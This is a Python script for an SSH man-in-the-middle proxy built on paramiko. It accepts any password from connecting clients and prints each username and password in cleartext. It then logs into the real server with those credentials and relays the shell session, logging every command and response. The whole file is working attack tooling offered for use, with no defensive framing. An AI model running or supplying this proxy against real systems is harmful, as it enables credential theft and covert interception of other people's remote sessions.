#!/usr/bin/env python3
"""
SSH Man-in-the-Middle Proxy
Intercepts SSH connections, logs all commands and responses.
Now properly handles PTY requests.
"""

# run the proxy: python3 main.py 22 192.168.10.155 22

import socket
import threading
import paramiko
import sys
import argparse

# Global flag to control data logging
LOG_DATA = True

def log_data(direction, data):
    """Print data with direction indicator."""
    if not LOG_DATA:
        return
    try:
        text = data.decode('utf-8', errors='replace')
        for line in text.splitlines():
            print(f"[{direction}] {line}")
    except:
        print(f"[{direction}] <binary: {len(data)} bytes>")

def forward(channel1, channel2, direction_prefix):
    """Forward data from one channel to another, logging it."""
    try:
        while True:
            data = channel1.recv(1024)
            if not data:
                break
            log_data(direction_prefix, data)
            channel2.send(data)
    except (EOFError, IOError, paramiko.SSHException):
        pass
    finally:
        channel1.close()
        channel2.close()

class ServerHandler(paramiko.ServerInterface):
    def __init__(self, client_address, remote_host, remote_port):
        self.client_address = client_address
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.event = threading.Event()
        # Store PTY parameters
        self.term = None
        self.width = 80
        self.height = 24

    def check_auth_password(self, username, password):
        print(f"[*] Authentication attempt: {username}:{password}")
        self.username = username
        self.password = password
        return paramiko.AUTH_SUCCESSFUL

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        # Accept PTY request and remember parameters
        self.term = term
        self.width = width
        self.height = height
        print(f"[*] PTY requested: {term} {width}x{height}")
        return True

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_exec_request(self, channel, command):
        print(f"[EXEC] {command.decode('utf-8', errors='replace')}")
        self.event.set()
        return True

def handle_connection(client_sock, addr, remote_host, remote_port):
    print(f"[+] New connection from {addr[0]}:{addr[1]}")

    transport = paramiko.Transport(client_sock)
    transport.local_version = "SSH-2.0-paramiko_mitm"
    host_key = paramiko.RSAKey.generate(2048)
    transport.add_server_key(host_key)

    handler = ServerHandler(addr, remote_host, remote_port)
    try:
        transport.start_server(server=handler)
    except paramiko.SSHException:
        print("[-] SSH negotiation failed.")
        client_sock.close()
        return

    channel = transport.accept(20)
    if channel is None:
        print("[-] No channel requested.")
        transport.close()
        return

    handler.event.wait(10)
    if not handler.event.is_set():
        print("[-] No shell/exec request.")
        transport.close()
        return

    print(f"[*] Connecting to real server {remote_host}:{remote_port} as {handler.username}")
    real_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        real_sock.connect((remote_host, remote_port))
    except Exception as e:
        print(f"[-] Failed to connect to real server: {e}")
        transport.close()
        return

    real_transport = paramiko.Transport(real_sock)
    real_transport.start_client()   # <-- removed the policy line

    try:
        real_transport.auth_password(handler.username, handler.password)
    except paramiko.AuthenticationException:
        print("[-] Authentication to real server failed.")
        real_transport.close()
        transport.close()
        return

    real_channel = real_transport.open_session()
    if handler.term:
        real_channel.get_pty(term=handler.term, width=handler.width, height=handler.height)
    else:
        real_channel.get_pty()

    real_channel.invoke_shell()

    t1 = threading.Thread(target=forward, args=(channel, real_channel, "C->S"))
    t2 = threading.Thread(target=forward, args=(real_channel, channel, "S->C"))
    t1.start()
    t2.start()

    t1.join()
    t2.join()

    real_transport.close()
    transport.close()
    print(f"[-] Connection from {addr[0]}:{addr[1]} closed.")

def start_mitm(local_host, local_port, remote_host, remote_port):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((local_host, local_port))
    server_sock.listen(10)
    print(f"[*] SSH MITM listening on {local_host}:{local_port}")
    print(f"[*] Forwarding to {remote_host}:{remote_port}")
    print("[*] Commands and responses will be printed below.")

    try:
        while True:
            client_sock, addr = server_sock.accept()
            threading.Thread(
                target=handle_connection,
                args=(client_sock, addr, remote_host, remote_port),
                daemon=True
            ).start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server_sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Man-in-the-Middle Proxy")
    parser.add_argument("local_port", type=int, help="Local port to listen on")
    parser.add_argument("remote_host", help="Remote SSH server hostname or IP")
    parser.add_argument("remote_port", type=int, help="Remote SSH server port")
    parser.add_argument("--local_host", default="0.0.0.0", help="Local bind address (default: 0.0.0.0)")
    parser.add_argument("--quiet", action="store_true", help="Suppress command logging")
    args = parser.parse_args()

    LOG_DATA = not args.quiet
    start_mitm(args.local_host, args.local_port, args.remote_host, args.remote_port)